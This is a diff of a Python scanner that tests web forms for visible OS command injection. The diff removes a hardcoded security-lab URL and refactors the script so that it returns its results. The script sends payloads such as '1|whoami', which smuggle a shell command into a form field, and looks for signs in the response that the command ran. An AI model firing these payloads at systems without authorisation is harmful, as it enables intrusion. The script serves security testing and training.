@@ -1,9 +1,6 @@
 import requests
 from bs4 import BeautifulSoup
 
-# Define the target URL and specific parameters known to be vulnerable
-base_url = 'https://0aab002404f4134c83526ea100380015.web-security-academy.net/'
-
 # Define a list of payloads for visible OS command injection
 visible_payloads = [
     '1|whoami',
@@ -50,11 +47,10 @@ def test_visible_injection(url, method, action, initial_params, payloads):
         if response.status_code == 200:
             response_text = response.text.lower()
             if any(keyword in response_text for keyword in ['root', 'uid=', 'linux', 'bin/', 'daemon', 'sys']):
-                print(f'[+] Visible Injection Detected with payload: {payload}')
-                return True
-    return False
+                return f'[+] Visible Injection Detected with payload: {payload}'
+    return 'No OS command injection vulnerabilities detected.'
 
-def main(url):
+def scan_os_command_injection(url):
     action, initial_params = find_form_action_and_params(url)
     
     if action is None or initial_params is None:
@@ -63,10 +59,12 @@ def main(url):
         initial_params = {'productId': '1', 'storeId': ''}
     
     # Test both POST and GET methods
-    if not test_visible_injection(url, 'POST', action, initial_params, visible_payloads):
-        if not test_visible_injection(url, 'GET', action, initial_params, visible_payloads):
-            print('No OS command injection vulnerabilities detected.')
+    result = test_visible_injection(url, 'POST', action, initial_params, visible_payloads)
+    if 'No OS' in result:
+        result = test_visible_injection(url, 'GET', action, initial_params, visible_payloads)
+    return result
 
-# User-provided URL
-user_url = input('Enter the URL to test for OS command injection: ')
-main(user_url)
+if __name__ == '__main__':
+    user_url = input('Enter the URL to test for OS command injection: ')
+    result = scan_os_command_injection(user_url)
+    print(result)
